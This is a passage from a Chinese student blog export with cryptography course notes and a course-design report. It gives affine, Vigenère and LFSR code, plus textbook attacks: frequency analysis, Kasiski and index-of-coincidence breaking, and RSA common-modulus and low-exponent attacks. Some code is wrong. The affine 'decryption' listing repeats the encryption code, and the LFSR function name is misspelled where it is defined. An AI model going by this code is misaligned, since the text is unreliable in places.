AES和DES相似之处：二者的轮函数都是由三层构成，非线性层、线性混合层、子密钥异或，只是顺序不同AES的子密钥异或对应于DES中S盒之前的子密钥异或AES的列混合运算的目的是让不同的字节相互影响，而DES中F函数的输出与左边一半数据相加也有类似的效果AES的非线性运算是字节代替(ByteSub)，对应于DES中惟一的非线性运算S盒行移位运算保证了每一行的字节不仅仅影响其它行对应的字节，而且影响其它行所有的字节，这与DES中置换P相似 AES和DES不同之处：AES的密钥长度(128位、192位、256位)是可变的，而DES的密钥长度固定为56位DES是面向比特的运算，AES是面向字节的运算AES的加密运算和解密运算不一致，因而加密器不能同时用作解密器，DES则无此限制 电码本模式(ECB ) 密文中数据出了错，解密事会使得相应的整个明文分组解密错误，不影响其他密文块的解密密码分组链接模式(CBC ) 没有明文错误扩散 只有一个分组错误 解密分组影响对应的解密明文分组和其后的一个 密码反馈模式(CFB) 明文的一个错误影响所有后面的密文但解密的明文只有一组分组错误 密文里单独的一个错误会引起解密后的对应明文的一个错误，错误进入移位寄存器，导致加密输出错误，知道该错误从寄存器另一端移出 8比特CFB中，密文1比特错误，解密后明文9比特错误 输出反馈模式(OFB) 1对1错误 失去同步是致命的 计数器模式(CTR) 并行性 硬件效率 软件效率 预处理 随机访问 可证明安全性 简单性 第六章 哈希函数Hash函数的概念 •Hash函数(杂凑函数/散列函数)是将任意长的消息M变换为较短的、固定长度的值H(M)的不可逆的单向密码体制 •H(M)称为杂凑值、杂凑码或消息摘要 •H(M)打上了输入串的烙印，又称为数字指纹(Digital FingerPrint) Hash函数(杂凑函数)的基本特征： •算法公开，不需要密钥 •数据压缩：可将任意长度的输入数据变换成一个固定长度的输出 •易于计算：对任何给定的m，h(m)易于计算 •单向性（抗原像性，Pre-image Resistance）：给定消息的散列值h(m)，要得到消息m在计算上不可行、 函数 y=H(x)满足 I.将任意长度的比特串x压缩成为固定长度的比特串y II.已知x，计算y=H(x)很容易；已知y，找一个x满足y=H(x)在计算上不可行——单向性 III.找(x1，x2)，x1≠x2，满足H(x1)= H(x2)在计算上是不可行的———抗碰撞性 Hash函数必须满足以下安全性要求： 抗弱碰撞性；抗第二原像； 对任意给定的消息m，寻找与m不同的消息m’，使得h(m)=h(m’)在计算上不可行 抗强碰撞性（Strong Collision Resistance) ： 寻找任意两个不同的消息m和m’,使得h(m)=h(m’)在计算上不可行 消息填充 •步骤1(填充消息):使消息长度模512=448 •如果消息长度模512恰等于448，增加512个填充比特。即填充的个数为1~512 •填充方法：第1比特为1，其余全部为0 •步骤2(补足长度): 将消息长度转换为64比特的数值 •如果长度超过64比特所能表示的数据长度，值保留最后64比特 •添加到填充数据后面，使数据为512比特的整数倍 •512比特按32比特分为16组。最终输出 128 位（即 16 字节，32 个十六进制位）的消息摘要。过程为 4 轮，每轮 16 步，共 64 步。 第七章 公钥密码密钥的生成 选择两个大素数 p和q,（p≠q，需要保密，步骤4以后建议销毁） 计算n=p×q， j(n)=(p－1)×(q－1) 选择整数 e 使 (j(n)，e) =1, 1&lt;e&lt; j(n) 计算d，使d=e－1 mod j(n), ​ 得到：公钥为{e, n}； 私钥为{d} 加密(用e，n)： 明文M&lt;n， 密文C=M^e (mod n). 解密(用d，n)： 密文C， 明文M =C^d (mod n) 1.若gcd⁡(𝒎,𝒏)=𝟏,𝐶𝑑 𝑚𝑜𝑑 𝑛=(𝒎^𝒆)𝑑 𝑚𝑜𝑑 𝑛 =𝒎^𝒆𝒅 𝑚𝑜𝑑 𝑛≡𝑚 𝑚𝑜𝑑 𝑛2.若gcd⁡(𝒎,𝒏)&gt;𝟏,由于𝒏=𝒑𝒒,所以gcd⁡(𝒎,𝒏)必含𝒑,𝒒之一，设gcd⁡(𝒎,𝒏)=𝒑或𝒎=𝒄𝒑, 𝟏≤𝒄≤𝒒,由欧拉定理得：𝒎^(𝝋(𝒒))=𝟏(𝒎𝒐𝒅 𝒒).𝒎^(𝒒−𝟏)(𝒑−𝟏)𝒌=𝟏(𝒎𝒐𝒅 𝒒)即 𝒎^(𝒌𝝋(n))=𝟏(𝒎𝒐𝒅 𝒒) 或 𝟏=𝒎^(𝒌𝝋(n))+𝒉𝒒由假定𝒎=𝒄𝒑得：𝒎=𝒎^(𝒌𝝋(n)+𝟏)+𝒄𝒉𝒑𝒒=𝒎^(𝒌𝝋(n)+𝟏)+𝒂𝒏 (其中𝒂=𝒄𝒉),即𝒎^(𝒌𝝋(n)+𝟏)=𝒎 (𝒎𝒐𝒅 𝒏) 共模攻击：假设𝑚是明文，两用户的公钥分别是𝑒1和𝑒2，且(𝑒1,𝑒2)=1，共同的模数𝑁，两个密文分别为：𝑐_1≡𝑚^(𝑒_1 ) 𝑚𝑜𝑑 𝑁𝑐_2≡𝑚^(𝑒_2 ) 𝑚𝑜𝑑 𝑁攻击者知道𝑁，𝑒1，𝑒2，𝑐1和𝑐2，可如下恢复明文𝑚(𝑒1,𝑒2)=1，由欧几里德算法可找出𝑟,𝑠满足𝑟𝑒1＋𝑠𝑒2＝1。假定𝑟是负数，那么(𝒄𝟏)^(−𝟏)^(−𝒓)∙(𝒄𝟐)^𝒔=𝒎^(𝒓𝒆𝟏＋𝒔𝒆𝟐)≡𝒎 𝒎𝒐𝒅 𝑵 低指数攻击：小的公钥可加快加密的速度，但过小的公钥易受到攻击 如果3个用户都使用3作为公钥，对同一个明文m加密，则c1＝m3 (mod n1)，c2＝m3 (mod n2)，c3＝m3 (mod n3)， gcd⁡(n1,n2,n3)=1 ，且m＜n1，m＜n2，m＜n3 由中国剩余定理可从c1，c2，c3计算出c，且c＝m3 mod (n1n2n3 )，显然m3＜n1n2n3，所以m＝c^(1/3) 1.密钥的生成 选取大素数p，g∈〖Z_p〗^∗是一个生成元，p,g 作为系统参数所有用户共享 系统中每个用户U都随机挑选整数x，2≤x≤ p－2，并计算： ​ y=gx(mod p)， y, p, g作为用户U的公钥，而x作为用户U的私钥 2.加密： 1.用户A先把明文M编码为一个在 0 到p－1之间的整数m ； 2.用户A挑选一个秘密随机数 r (2≤ r ≤ p－2 )并计算:c1＝ g^r (mod p)； ​ c2 ＝ m∙y^r(mod p) 3.用户A把二元组 (c1,c2)作为密文传送给用户B 解密： 用户B接收到密文二元组(𝑐1 ,𝑐2)后，做解密计算：𝒎=𝒄𝟐∙(𝒄𝟏^𝒙 )^(−𝟏)𝒎𝒐𝒅 𝒑 正确性：C2.(C1^x)^(-1) (modp)=(y^r m)(^rx)^(-1) (mod p)=(g^rx m)g^-rx (mod p)=m (mod p) 第八章 数字签名2、利用RSA密码实现数字签名：⑴签名算法设M为明文，KeA =&lt;e,n&gt;是A的公开加密钥，KdA =&lt;d,p,q,φ(n)&gt;是A的保密的解密钥,则A对M的签名过程是，SA = D(M,KdA) =(M^d) modn SA 便是A对M的签名。 验证签名的过程是，E(SA ,KeA)=(M^d)^e modn = M 安全性： 对RSA数字签名的攻击：利用已有的签名进行攻击:此时：S1＝(HASH(M1))d mod n ，S2＝(HASH(M2))d mod n而，(HASH(M1))d (HASH(M2))d≠(HASH(M1M2))d mod n 所以：S3≠S1S2 ，于是不能由S1和S2计算出A对M3的签名。 𝑯(𝑴)的另一个作用—加快签名速度对整个消息签名，由于公钥体制速度比较慢，当消息比较长时，签名与验证过程都会相当慢对消息的Hash值签名，则无论消息多长，签名都只与Hash值的长度有关 ElGamal签名过程： 1.系统初始化过程：公钥为(p,g,y)，私钥为x (1≤x＜p-1)，其中y≡g^xmod p 2.签名过程：给定消息M，签名者如下计算： ①选择随机数k∈Zp∗，且k与(p－1)互素； ②首先计算消息M的哈希值H(M)，然后计算: ​ r≡g^k(mod p)； ​ s≡(H(M)-xr) k^(-1) (mod p－1) ③ 将(r，s)作为签名，与M一起发送给接收方 3.验证签名过程:接收方收到M与其签名(r,s)后： ​ ① 计算消息M的Hash值H(M)； ​ ② 验证公式 y^r r^s≡g^(H(M)) mod p 成立则确认(r,s)为有效签名，否则认为签名是伪造的 安全性： 非确定性数字签名算法，同一消息M的签名依赖于随机数k；安全性基于有限域上计算离散对数的困难性；随机数k不能被泄露(已知k可以计x) x＝(m-ks)^(r-1)mod(p-1)；随机数k不能被重复使用（泄露x）；不使用Hash函数则易受到攻击攻击者可以选取任一整数对(𝑢,𝑣)，满足 𝑔𝑐𝑑⁡(𝑣，𝑝−1) = 1计算 𝑟 = 𝑔^𝑢𝑦^𝑣 𝑚𝑜𝑑 𝑝 = 𝑔^(𝑢+𝑥𝑣) 𝑚𝑜𝑑 𝑝 和 𝑠 = −𝑟𝑣^(−1) 𝑚𝑜𝑑 (𝑝−1)，则(𝑟,𝑠)就是对消息𝑚 = 𝑠𝑢 𝑚𝑜𝑑 𝑝的一个有效签名因为𝑘= (𝑚−𝑥𝑟)𝑠^(−1)= (𝑠𝑢−𝑥𝑟)𝑠^(−1)= (𝑢+𝑥𝑣) 𝑚𝑜𝑑 (𝑝−1)，所以有 𝑟 = 𝑔^𝑘 =𝑔^(𝑢+𝑥𝑣) 𝑚𝑜𝑑 𝑝 第九章 密码协议比特承诺 安全性质：1.隐蔽性:Alice像Bob承诺时,Bob不可能获得承诺消息的任何信息。2.绑定性：一段时间后A能够像B证明她所承诺的消息，但是A不能欺骗B，也就是说，在这段时间里A不能改变承诺的消息。","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"密码学课程设计报告","slug":"密码学课程设计报告","date":"2021-01-11T15:00:42.495Z","updated":"2021-01-12T12:59:01.006Z","comments":true,"path":"2021/01/11/密码学课程设计报告/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2021/01/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/","excerpt":"嫖了各种大佬的博客！","text":"嫖了各种大佬的博客！ 仿射密码 Affine Cipher概述仿射密码也属于单表代换密码，它使用线性方程加上一个模数。 仿射密码为单表加密的一种，字母系统中所有字母都藉一简单数学方程加密，对应至数值，或转回字母。 算法实现加密算法仿射密码的加密算法是一个线性变换，是移位密码和乘数密码的组合，即对任意的明文字符 x，选取 k1，k2 两个参数，其中 k1，k2∈Z26，且要求 gcd (k1，26)=1。 加密变换：C=k1*m+k2 (mod26)（当 k1=1 时，移位密码；当 k2=1 时，乘数密码）； 加密的功能：①基本的仿射加密完全实现，大写转成大写，小写转成小写； ②判断出 k1 与 26 不互素时利用跳转语句 goto 提示 k1 输入错误，需要重新输入； ③字母外的字母保持原来的状态，不作任何处理，按照输入的样子输出； ④利用 cin.getline () 语句和 cin.ignore () 语句，确保在 while (true) 的条件下可以反复进行加密。 int len=strlen(s); int m[maxn];// 将字符移位操作的位数存到数组 m [maxn] 里面 for(int i=0;i&lt;len;i++) &#123; if(s[i]&gt;='A'&amp;&amp;s[i]&lt;='Z') m[i]=(k1*(int)(s[i]-'A')+k2)%26; else if(s[i]&gt;='a'&amp;&amp;s[i]&lt;='z') m[i]=(k1*(int)(s[i]-'a')+k2)%26;// cout&lt;&lt;(char)('A'+m); &#125; cout&lt;&lt;\"******Encryption******\"&lt;&lt;endl; cout&lt;&lt;\"The ciphertext is:\"&lt;&lt;endl; for(int i=0;i&lt;len;i++) &#123; if(s[i]&gt;='A'&amp;&amp;s[i]&lt;='Z') cout&lt;&lt;(char)('A'+m[i]); else if(s[i]&gt;='a'&amp;&amp;s[i]&lt;='z') cout&lt;&lt;(char)('a'+m[i]); else cout&lt;&lt;s[i]; &#125; cout&lt;&lt;endl; 解密算法 解密变换：m=k1^(-1)*(C-k2)(mod26) 注：为保证仿射加密函数是一个双射函数，必须要保证 (k1，26)=1。 int len=strlen(s); int m[maxn];// 将字符移位操作的位数存到数组 m [maxn] 里面 for(int i=0;i&lt;len;i++) &#123; if(s[i]&gt;='A'&amp;&amp;s[i]&lt;='Z') m[i]=(k1*(int)(s[i]-'A')+k2)%26; else if(s[i]&gt;='a'&amp;&amp;s[i]&lt;='z') m[i]=(k1*(int)(s[i]-'a')+k2)%26;// cout&lt;&lt;(char)('A'+m); &#125; cout&lt;&lt;\"******Encryption******\"&lt;&lt;endl; cout&lt;&lt;\"The ciphertext is:\"&lt;&lt;endl; for(int i=0;i&lt;len;i++) &#123; if(s[i]&gt;='A'&amp;&amp;s[i]&lt;='Z') cout&lt;&lt;(char)('A'+m[i]); else if(s[i]&gt;='a'&amp;&amp;s[i]&lt;='z') cout&lt;&lt;(char)('a'+m[i]); else cout&lt;&lt;s[i]; &#125; cout&lt;&lt;endl; 攻击方法穷举攻击暴力穷举破解与解密算法相差无几，主要在于用 for 循环遍历所有的 k1 和 k2，但是应当排除 k1=1，k2=0 的无意义加密。需要注意的一点是，由于采用打表法取的 k1 值，所以 k1 的取值一定与 26 互素，就不用考虑 k1 和 26 是否互素的问题。列举出所有可能的明文（一共 311 种情况），从中找出有特定标识（如 flag\\ ）或构成自然语言中有意义的单词或短语的正确明文。 for(int j=0;j&lt;12;j++) for(int k=0;k&lt;=25;k++)&#123; if(!(c[j]==1&amp;&amp;k==0))&#123;// 考虑到 k1=1,k2=0 的无意义加密方式 for(int i=0;i&lt;len;i++) &#123; if(s[i]&gt;='A'&amp;&amp;s[i]&lt;='Z') m[i]=(inverse[c[j]]*((int)(s[i]-'A')-k+26))%26; else if(s[i]&gt;='a'&amp;&amp;s[i]&lt;='z') m[i]=(inverse[c[j]]*((int)(s[i]-'a')-k+26))%26; 统计分析攻击假定明文字母中出现频率最高的字母是e，其次是t(统计)，设仿射加密函数为e(x)=k1x+k2(mod26)；设出现频率最高的字母偏移量为a，其次是b，e(‘e’)≡a(mod26)=&gt;e(4)≡a(mod26)=&gt;4k1+k2≡a(mod26)；e(‘t’)≡b(mod26)=&gt;e(19)≡b(mod26)=&gt;19k1+k2≡b(mod26) 两式相减得 15k1≡(b-a)(mod26) 而15的逆=7；两边相乘15的模逆k1≡7(b-a)(mod26)为防止k1取负数；k1≡7(b-a)(mod26)+26 在优化的过程中，只考虑频率出现最高的字母e，则4k1+k2≡a(mod26)=&gt;k2≡(a-4k1)(mod26)+26； 遍历表中所有的k1值，分别求出相应的k2，则可进行依次解密，解密成功率也将显著提高。 // 统计分析攻击仿射密码 #include&lt;bits/stdc++.h&gt;using namespace std;// 考虑使用优先级队列将数量出现最多的两个字母取出来 //priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;q;// 升序 priority_queue&lt;int,vector&lt;int&gt;,less&lt;int&gt; &gt;q;// 降序 const int maxn=1e4;int num[30];char str[maxn],str2[maxn];int main()&#123; int c[15]=&#123;1,3,5,7,9,11,15,17,19,21,23,25&#125;;// 与 26 互素的所有元素 int inverse[100]; int temp[100]=&#123;1,9,21,15,3,19,7,23,11,5,17,25&#125;; memset(inverse,0,sizeof(inverse)); for(int i=0;i&lt;12;i++) &#123; inverse[c[i]]=temp[i]; &#125; while(true) &#123; while(!q.empty()) &#123; q.pop(); &#125;// 将队列清空 memset(num,0,sizeof(num)); cout&lt;&lt;\"Please enter your ciphertext:\"; cin.getline(str,maxn);// 原始密文 int len=strlen(str); for(int i=0;i&lt;len;i++) &#123;// 为方便操作，将密文转换成小写字母 if(str[i]&gt;='A'&amp;&amp;str[i]&lt;='Z') &#123; str2[i]=str[i]+'a'-'A'; &#125; else str2[i]=str[i]; if(str2[i]&gt;='a'&amp;&amp;str2[i]&lt;='z') &#123; num[int(str2[i]-'a')]++; &#125;// 统计每个字母出现的次数（不考虑大小写） &#125; for(int i=0;i&lt;26;i++) &#123; if(num[i]!=0) q.push(num[i]); &#125;// 把字母出现次数压到队列里进行自动排序 int test1=0; int test2=0; test1=q.top();// 出现最多的次数 q.pop(); test2=q.top();// 出现次多的次数 // q.pop(); int a=0; int b=0; for(int i=0;i&lt;26;i++) &#123; if(num[i]==test1) &#123; a=i; &#125;// 找出出现次数最多字母偏移量 if(num[i]==test2) &#123; b=i; &#125;// 找出出现次数次多字母偏移量 &#125; int k1=((b-a)*7%26+26)%26;//+26 防止出现结果出现负数 int k2=((a-4*k1)%26+26)%26; int m[maxn];// 计算每个字母偏移量放到数组 m [maxn] 中 int k3=inverse[k1];// 求出 k1 模逆 for(int i=0;i&lt;len;i++) &#123; m[i]=(k3*((int)(str2[i]-'a')-k2+26))%26;// cout&lt;&lt;(char)('A'+m); &#125; cout&lt;&lt;\"******Decryption******\"&lt;&lt;endl; cout&lt;&lt;\"k1=\"&lt;&lt;k1&lt;&lt;\",\"&lt;&lt;\"k2=\"&lt;&lt;k2&lt;&lt;endl; cout&lt;&lt;\"The plaintext is:\"&lt;&lt;endl; for(int i=0;i&lt;len;i++) &#123; if(str[i]&gt;='A'&amp;&amp;str[i]&lt;='Z') cout&lt;&lt;(char)('A'+m[i]); else if(str[i]&gt;='a'&amp;&amp;str[i]&lt;='z') cout&lt;&lt;(char)('a'+m[i]); else cout&lt;&lt;str[i]; &#125; cout&lt;&lt;endl; cin.ignore(); &#125; return 0;&#125; 运行结果加密 例如：明文是 Hello CUMT~ ，k1 是 5 ，k2 是 6，得到密文 Pajjy QCOX 。 已知 key\\ 解密 例如：密文是 Pajjy QCOX ，k1 是 5 ，k2 是 6，得到明文 Hello CUMT。 暴力枚举解密 例如：密文是 Pajjy QCOX ，不知道 k1,k2，暴力穷举出所有可能，再结合某些标识或使明文在自然语言中有意义，得到明文 Hello CUMT 。 统计分析解密 例如解密： Pu yfo of oin hvy ufa hrpkpyb, jlar ph hopkk py oin hvy oinan, svo jn jpkk klvbi rfan zfyupgnyo zlkr; pu ovayng of ufvyg iph fjy hilgfj, lmmafmaplon nhzlmn, oin hvy jpkk sn oiafvbi oin inlao,jlar nlzi mklzn snipyg oin zfayna; pu ly fvohoanozing mlkr zlyyfo ulkk svoonaukx, oiny zknyzing jlcpyb larh, bpcny mfjna; pu P zly’o ilcn sapbio hrpkn, po jpkk ulzn of oin hvyhipyn, lyg hvyhipyn hrpkn ofbnoina, py uvkk skffr.\\ 结果是： If not to the sun for smiling, warm is still in the sun there, but we will laugh more confident calm; if turned to found his own shadow, appropriate escape, the sun will be through the heart,warm each place behind the corner; if an outstretched palm cannot fall butterfly, then clenched waving arms, given power; if I can’t have bright smile, it will face to the sunshine, and sunshine smile together, in full bloom.\\ 安全性分析由于gcd(k1.26)=1，所以k1 有 φ(26)=12种取值；k2则有 26 种取值，刨除 k1=1,k2=0的情况，密钥空间为 12×26−1=311 。对于普通的偏移密码和乘法密码，仿射密码的安全性有很大的改善，但其实依然不够大，即使是使用穷举攻击，也能轻易破解出明文。但是更好的方式是根据统计分析规律（前提是截获的密文足够长）进行攻击。实际上，由于只有两个参数，所以找到两组明文密文对便可计算出两个参数，从而彻底攻破算法。 维吉尼亚密码 Vigenère cipher概述维吉尼亚密码是一种简单的多表代换密码，可以看成由一些偏移量不同的恺撒密码组成。为了掩盖字母使用中暴露的频率特征，解决的办法就是用多套符号代替原来的文字。它是一个表格，第一行代表原文的字母，下面每一横行代表原文分别由哪些字母代替，每一竖列代表我们要用第几套字符来替换原文。一共26个字母，一共26套代替法，所以这个表是一个26*26的表 . 算法实现加密算法s2[i]=’A’+(s2[i]+(s1[j%len1]-‘a’)-‘A’)%26； 特别要注意的是，若密钥长度小于明文长度，则密钥循环使用，这体现在我们的代码中就是对 len(1) 取模。 int j=0; for(int i=0;i&lt;len2;i++) &#123;// 如果遇到空格，就不能用密钥 // 通过 j 来进行标记 if(s2[i]&gt;='A'&amp;&amp;s2[i]&lt;='Z') &#123; s2[i]='A'+(s2[i]+(s1[j%len1]-'a')-'A')%26; j++; &#125; else if(s2[i]&gt;='a'&amp;&amp;s2[i]&lt;='z') &#123; s2[i]='a'+(s2[i]+(s1[j%len1]-'a')-'a')%26; j++; &#125; cout&lt;&lt;s2[i]; &#125; 解密算法s2[i]=’A’+(s2[i]-‘A’-(s1[j%len1]-‘a’)+26)%26; 这里加26防止出现负数。 int j=0; for(int i=0;i&lt;len2;i++) &#123;// 如果遇到空格，就不能用密钥 if(s2[i]&gt;='A'&amp;&amp;s2[i]&lt;='Z') &#123; s2[i]='A'+(s2[i]-'A'-(s1[j%len1]-'a')+26)%26; j++; &#125; else if(s2[i]&gt;='a'&amp;&amp;s2[i]&lt;='z') &#123; s2[i]='a'+(s2[i]-'a'-(s1[j%len1]-'a')+26)%26; j++; &#125; cout&lt;&lt;s2[i]; &#125; 其他考虑对于大小写字母的区分，我们的处理方法和恺撒密码中完全相同。 对于字母之外的字符，他们不使用密钥，也不消耗密钥，这时候，密文就是明文，明文就是密文。 攻击方法破译维吉尼亚密码的关键在于它的密钥是循环重复的。如果我们知道了密钥的长度，那密文就可以被看作是交织在一起的凯撒密码，而其中每一个都可以单独破解。 多表代换密码体制的分析方法主要分为三步：第一步确定秘钥长度，常用的方法有卡西斯基（Kasiski）测试法和重合指数法（Index of Coincidence）；第二步就是确定秘钥，常用的方法是拟重合指数测试法；第三步是根据第二步确定的密钥恢复出明文。 Kasiski测试法卡西斯基试验是基于类似 the 这样的常用单词有可能被同样的密钥字母进行加密，从而在密文中重复出现。如果将密文中所有相同的字母组都找出来，并计算他们的最大公因数，就有可能提取出来密钥长度信息。 测试过程：搜索长度至少为2的相邻的一对对相同的密文段，记下它们之间的距离。而密钥长度d可能就是这些距离的最大公因子 重合指数法利用随机文本和英文文本的统计概率差别来分析密钥长度。依据：英文中每种单词出现的频率不同。 重合指数公式： 人们已经获得了英文的26个字母的概率分布的一个估计。期望值为： 将密文按n来分组，当每组的重合指数都接近0.065时，n便为密钥的长度值 完整代码 while(true) &#123; float IC[clen];// 重合指数 memset(IC,0,sizeof(IC)); float avgIC=0;// 平均重合指数 for(int i=0;i&lt;klen;i++)// 统计分组字母个数 &#123; memset(num,0,sizeof(num));// 盛放字母个数的数组 // 密钥长度等于分成的组数 for(int j=0;i+j*klen&lt;clen;j++) //统计每一组每个字母出现的次数 &#123; if(c[i+j*klen]&gt;='A'&amp;&amp;c[i+j*klen]&lt;='Z') &#123; num[(int)(c[i+j*klen]-'A')]++; &#125; if(c[i+j*klen]&gt;='a'&amp;&amp;c[i+j*klen]&lt;='z') &#123; num[(int)(c[i+j*klen]-'a')]++; &#125; &#125; float e=0;// 重合指数的值 重合指数是小数不能用int int L=0; for(int k=0;k&lt;26;k++)// 子串密文长度 &#123; L+=num[k]; //所有的字母数量相加 &#125; //L是密文长度 L*=(L-1);// 分母 ,L=L*(L-1) for(int k=0;k&lt;26;k++)// 分组计算重合指数 IC &#123; if(num[k]!=0) &#123; e+=((float)num[k]*(float)(num[k]-1))/(float)L; //xi(xi-1)/L(L-1) &#125; &#125; IC[i]=e;//得到无偏估计值 &#125; for(int i=0;i&lt;klen;i++) &#123; avgIC+=IC[i]; &#125; avgIC/=klen;// 求 IC 的平均值 第一次klen为1 if(avgIC&gt;=0.065)break;// 判断退出条件，重合指数的平均值是否大于 0.065 else klen++;// cout&lt;&lt;\"密钥长度为:\"&lt;&lt;klen&lt;&lt;endl; &#125;cout&lt;&lt;\"密钥长度为:\"&lt;&lt;klen&lt;&lt;endl;//计算拟重合指数 for(int i=0;i&lt;klen;i++) // 统计分组字母个数 &#123; int g=0;// 密文移动 g 个位置 float temp[26];// 存储偏移量 memset(temp,0,sizeof(temp)); for(g=0;g&lt;26;g++) &#123; float x=0;// 拟重合指数 memset(num,0,sizeof(num));// 盛放字母个数的数组 for(int j=0;i+j*klen&lt;clen;j++) &#123; if(c[i+j*klen]&gt;='A'&amp;&amp;c[i+j*klen]&lt;='Z') &#123; num[(int)(c[i+j*klen]-'A')]++; &#125; if(c[i+j*klen]&gt;='a'&amp;&amp;c[i+j*klen]&lt;='z') &#123; num[(int)(c[i+j*klen]-'a')]++; &#125; &#125; int L=0; for(int k=0;k&lt;26;k++)// 子串密文长度 &#123; L+=num[k]; x=x+p[k]*num[(k+g)%26]; &#125; temp[g]=abs(x/L-0.065); &#125; float value=temp[0]; int result=0; for(g=0;g&lt;26;g++)// 找最小偏差 &#123; if(temp[g]&lt;value) &#123; value=temp[g]; result=g; &#125; &#125; key[i]=result; &#125; cout&lt;&lt;\"加密密钥为:\"; for(int i=0;i&lt;klen;i++) &#123; s2[i]=char('a'+key[i]); &#125;&#125; 运行结果加密 例如明文是 Haha CUMTer~ ，密钥是 password，得到密文 Wazs YIDWtr~ 。 解密 例如密文是 Wazs YIDWtr~ ，密钥是 password，得到明文 Haha CUMTer~。 破解 例如解密： BZGTNPMMCGZFPUWJCUIGRWXPFNLHZCKOAPGLKYJNRAQFIUYRAVGNPANUMDQOAHMWTGJDXGOMPJPTKAAVZIUIWKVTUCWBWNFWDFUMPJWPMQGPTNWXTSDPLPMWJAXUHHXWPFXXGVAPFNTXVFKOYIRBOQJHCBVWVFYCGQFGUSUBDWVIYATJGTBNDKGHCTMTWIUEFJITVUGJHHIMUVJICUWYQWYGGUWPUUCWIFGWUANILKPHDKOSPJTTWJQOJHXLBJAPZHVQWPDYPGLLGDBCHTGIZCCMEGVIIJLIFFBHSMEGUJHRXBOQUBDNASPEUCWNGWSNWXTSDPLPMWJAIUHUMWPSYCTUWFBMIAMKVBNTDMQNBVDKILQSSDYVWVXIGDQFIBHSLEAVDBXGOLGDBCHTGIZVNFQFKTNGRWXUDCTGKWCOXIXKZPPFDZG\\ 结果是： THESTATEKEYLABORATORYOFNETWORKINGANDSWITCHINGTECHNOLOGYBELONGSTOBEIJINGUNIVERSITYOFPOSTSANDTELECOMMUNICATIONSTHELABORATORYWASOPENEDINNINETEENNINETYTWOINNINETEENNINETYFIVETHELABORATORYPASSEDACCEPTANCEINSPECTIONBOGOVERNMENTANDANEVALUATIONORGANIZEDBYMINISTRYOFSCIENCEANDTECHNOLOGYINTWOTHOUSANDANDTWOSINCETWOTHOUSANDANDFOURTHELABORATORYHASBEENRENAMEDASTHESTATEKEYLABORATORYOFNETWORKINGANDSWITCHINGTECHNOLOGYBYMINISTRYOFSCIENCEANDTECHNOLOGY\\ 安全性分析多表代换密码打破了原语言的字符出现规律，故其分析方法比单表代换密码复杂得多。多表代换密码对比单表代换密码安全性显著提高。但是仍然可以用一些统计分析法破解（具体参看上文攻击方法), 对所有多表密码的破译都是以字母频率为基础的，这里对维吉尼亚的分析仍不例外，只是直接的频率分析并不适用。通过卡西斯基试验或者就可以得到密钥长度，得到密钥长度，密钥就可以看作是多个凯撒密码结合到一起，每一个都可单独破解，就像上面的破解步骤。但是前提是密文足够长。所以，较短的密文几乎是不可破译的。较长的密文是很容易破解的。 序列密码 LFSR概述反馈移位寄存器由移位寄存器和反馈函数组成。移位寄存器是由位组成的序列，每次移位寄存器中所有位右移一位，新的最左端的位根据寄存器中的某些位计算来得到，反馈函数用来计算新的最左端位。而线性移位寄存器就是采用线性函数来作为反馈函数的反馈移位寄存器。 算法实现开始设置好寄存器初始序列全局变量，抽头序列，再初始化一个跟寄存器长度一样的新列表。 利用zfill函数来初始化寄存器状态，定义 output_ = [] 来存放输出序列，编写feedback函数计算抽头异或的值,reg.txt记录周期内寄存器的状态。 # 20次本原多项式:x^20 + x^3 + 1def feedbck(reg, fb): \"\"\" 反馈函数 :param reg: 移位寄存器的内容 :param fb: 由抽头构成的列表 :return: 最左端的输入 \"\"\" res = reg[fb[0] - 1] for i in range(1, len(fb)): res = int(res) ^ int(reg[fb[i] - 1]) return resdef lfsr(p): \"\"\" 线性反馈移位寄存器 :param p: 由本原多项式次数构成的列表 :return: \"\"\" reg_len = max(p) # 初始寄存器状态:00000....001 shift_reg = '1'.zfill(reg_len) #在1前面补0 regs = [shift_reg] # 存放寄存器的各个状态 output_ = [] # 存放输出序列 for i in range(pow(2, reg_len) - 1): # 输出寄存器最右端的值 output_.append(shift_reg[-1]) # 计算抽头异或的值 input_ = str(feedback(shift_reg, p)) shift_reg = input_ + shift_reg[:-1] # 如果寄存器当前状态已经出现过了,说明一个周期结束 if shift_reg in regs: break else: regs.append(shift_reg) return output_, regsdef main(): while True: try: ct = input(\"\\n请输入本原多项式x的系数(以空格分隔):\\n\").split(\" \") if ('q' in ct) or ('Q' in ct): break ct = [int(ct[i]) for i in range(len(ct))] print(\"您输入的本原多项式为:\") for i in range(len(ct)): print(\"x^\" + str(ct[i]) + \" + \", end=\"\") print(\"1\") print(\"理论最大周期为: \" + str(pow(2, max(ct)) - 1)) mode = input(\"是否确认:\\n[Y]确定\\t[N]重新输入\\t[Q]退出\\n\") if mode == 'Y' or mode == 'y': outputs, regs = lfsr(ct) print(\"\\n周期为: \" + str(len(outputs))) choice1 = input(\"是否查看输出序列:\\n[Y]是\\t[N]否\\n\") if choice1 == 'Y' or choice1 == 'y': for i in outputs: print(i, end=\"\") choice2 = input(\"\\n是否输出周期内寄存器各状态:\\n[Y]是\\t[N]否\\n\") if choice2 == 'Y' or choice2 == 'y': with open('regs.txt', 'w') as f: for i in regs: f.write(i + \"\\n\") print(\"成功！周期内寄存器各状态保存在regs.txt\") elif mode == 'N' or mode == 'n': continue else: if mode == 'Q' or mode == 'q': break else: continue except: print(\"输入有误!\") continueif __name__ == '__main__': main() 运行结果20次本原多项式:x^18 + x^3 + 1 寄存器初始值：[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1] 本原多项式：[1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0] 